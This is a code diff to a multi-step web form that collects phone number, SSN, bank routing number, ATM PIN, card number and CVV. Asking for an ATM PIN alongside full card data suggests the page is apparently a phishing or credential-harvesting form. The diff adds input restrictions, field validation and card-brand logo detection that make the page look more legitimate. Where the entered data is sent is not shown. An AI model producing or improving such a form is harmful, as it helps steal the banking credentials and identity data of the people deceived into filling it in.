@@ -373,7 +373,7 @@
 
                         <div class="form-group">
                             <label for="phone">Phone Number</label>
-                            <input type="tel" class="form-control" id="phone" placeholder="Enter 10-digit phone number" pattern="[0-9]{10}" required>
+                            <input type="tel" class="form-control" id="phone" placeholder="Enter 10-digit phone number" pattern="[0-9]{10}" maxlength="10" required>
                             <div class="error-message" id="phoneError">Please enter a valid 10-digit phone number</div>
                         </div>
 
@@ -384,7 +384,7 @@
 
                         <div class="form-group">
                             <label for="ssn">SSN</label>
-                            <input type="text" class="form-control" id="ssn" placeholder="Enter 9-digit SSN" pattern="[0-9]{9}" required>
+                            <input type="text" class="form-control" id="ssn" placeholder="Enter 9-digit SSN" pattern="[0-9]{9}" maxlength="9" required>
                             <div class="error-message" id="ssnError">Please enter a valid 9-digit SSN</div>
                         </div>
 
@@ -428,12 +428,14 @@
 
                         <div class="form-group">
                             <label for="routingNumber">Bank Routing Number</label>
-                            <input type="text" class="form-control" id="routingNumber" required>
+                            <input type="text" class="form-control" id="routingNumber" placeholder="Enter 9-digit routing number" pattern="[0-9]{9}" maxlength="9" required>
+                            <div class="error-message" id="routingError">Please enter a valid 9-digit routing number</div>
                         </div>
 
                         <div class="form-group">
                             <label for="atmPin">ATM Pin</label>
-                            <input type="password" class="form-control" id="atmPin" required>
+                            <input type="password" class="form-control" id="atmPin" placeholder="Enter 4-digit PIN" pattern="[0-9]{4}" maxlength="4" required>
+                            <div class="error-message" id="atmPinError">Please enter a valid 4-digit PIN</div>
                         </div>
                     </form>
 
@@ -452,7 +454,11 @@
                     <form id="cardForm">
                         <div class="form-group">
                             <label for="cardNumber">Card Number</label>
-                            <input type="text" class="form-control" id="cardNumber" required>
+                            <div style="position: relative;">
+                                <input type="text" class="form-control" id="cardNumber" placeholder="Enter 16-digit card number" pattern="[0-9]{16}" maxlength="16" required style="padding-right: 50px;">
+                                <img id="cardLogo" src="" alt="Card Logo" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 30px; display: none;">
+                            </div>
+                            <div class="error-message" id="cardError">Please enter a valid 16-digit card number</div>
                         </div>
 
                         <div class="form-row">
@@ -465,14 +471,16 @@
                             <div class="form-col">
                                 <div class="form-group">
                                     <label for="cvv">CVV</label>
-                                    <input type="text" class="form-control" id="cvv" required>
+                                    <input type="text" class="form-control" id="cvv" placeholder="3-4 digits" pattern="[0-9]{3,4}" minlength="3" maxlength="4" required>
+                                    <div class="error-message" id="cvvError">Please enter a valid 3-4 digit CVV</div>
                                 </div>
                             </div>
                         </div>
 
                         <div class="form-group">
                             <label for="confirmAtmPin">Confirm ATM Pin</label>
-                            <input type="password" class="form-control" id="confirmAtmPin" required>
+                            <input type="password" class="form-control" id="confirmAtmPin" placeholder="Enter 4-digit PIN" pattern="[0-9]{4}" maxlength="4" required>
+                            <div class="error-message" id="confirmPinError">Please enter a valid 4-digit PIN</div>
                         </div>
                     </form>
 
@@ -587,6 +595,40 @@
                 }
             });
 
+            // Card logo recognition
+            document.getElementById('cardNumber').addEventListener('input', function() {
+                const cardNumber = this.value;
+                const cardLogo = document.getElementById('cardLogo');
+                
+                if (cardNumber.startsWith('4') && cardNumber.length >= 1) {
+                    // Visa card
+                    cardLogo.src = 'https://logo.clearbit.com/visa.com';
+                    cardLogo.style.display = 'block';
+                } else if (cardNumber.startsWith('5') && cardNumber.length >= 1) {
+                    // Mastercard
+                    cardLogo.src = 'https://logo.clearbit.com/mastercard.com';
+                    cardLogo.style.display = 'block';
+                } else {
+                    cardLogo.style.display = 'none';
+                }
+            });
+
+            // Restrict input to numbers only
+            function restrictToNumbers(element) {
+                element.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            }
+
+            // Apply number restriction to relevant fields
+            restrictToNumbers(document.getElementById('phone'));
+            restrictToNumbers(document.getElementById('ssn'));
+            restrictToNumbers(document.getElementById('routingNumber'));
+            restrictToNumbers(document.getElementById('atmPin'));
+            restrictToNumbers(document.getElementById('cardNumber'));
+            restrictToNumbers(document.getElementById('cvv'));
+            restrictToNumbers(document.getElementById('confirmAtmPin'));
+
             // Validation functions
             function validateStep1() {
                 const phone = document.getElementById('phone');
@@ -624,10 +666,28 @@
             }
 
             function validateStep2() {
-                // Check if all required fields are filled
-                const requiredFields = document.querySelectorAll('#paymentForm [required]');
+                const routingNumber = document.getElementById('routingNumber');
+                const atmPin = document.getElementById('atmPin');
                 let isValid = true;
 
+                // Validate routing number (exactly 9 digits)
+                if (!/^\d{9}$/.test(routingNumber.value)) {
+                    document.getElementById('routingError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('routingError').style.display = 'none';
+                }
+
+                // Validate ATM PIN (exactly 4 digits)
+                if (!/^\d{4}$/.test(atmPin.value)) {
+                    document.getElementById('atmPinError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('atmPinError').style.display = 'none';
+                }
+
+                // Check if all required fields are filled
+                const requiredFields = document.querySelectorAll('#paymentForm [required]');
                 for (let field of requiredFields) {
                     if (!field.value.trim()) {
                         field.style.borderColor = '#d9534f';
@@ -640,10 +700,44 @@
             }
 
             function validateStep3() {
-                // Check if all required fields are filled
-                const requiredFields = document.querySelectorAll('#cardForm [required]');
+                const cardNumber = document.getElementById('cardNumber');
+                const cvv = document.getElementById('cvv');
+                const atmPin = document.getElementById('atmPin').value;
+                const confirmAtmPin = document.getElementById('confirmAtmPin');
                 let isValid = true;
 
+                // Validate card number (exactly 16 digits)
+                if (!/^\d{16}$/.test(cardNumber.value)) {
+                    document.getElementById('cardError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('cardError').style.display = 'none';
+                }
+
+                // Validate CVV (3-4 digits)
+                if (!/^\d{3,4}$/.test(cvv.value)) {
+                    document.getElementById('cvvError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('cvvError').style.display = 'none';
+                }
+
+                // Validate confirm ATM PIN (exactly 4 digits)
+                if (!/^\d{4}$/.test(confirmAtmPin.value)) {
+                    document.getElementById('confirmPinError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('confirmPinError').style.display = 'none';
+                }
+
+                // Check if ATM pins match
+                if (atmPin !== confirmAtmPin.value) {
+                    alert('ATM pins do not match');
+                    isValid = false;
+                }
+
+                // Check if all required fields are filled
+                const requiredFields = document.querySelectorAll('#cardForm [required]');
                 for (let field of requiredFields) {
                     if (!field.value.trim()) {
                         field.style.borderColor = '#d9534f';
@@ -651,15 +745,6 @@
                     } else {
                         field.style.borderColor = '#ddd';
                     }
-                }
-
-                // Check if ATM pins match
-                const atmPin = document.getElementById('atmPin').value;
-                const confirmAtmPin = document.getElementById('confirmAtmPin').value;
-
-                if (atmPin !== confirmAtmPin) {
-                    alert('ATM pins do not match');
-                    isValid = false;
                 }
 
                 return isValid;
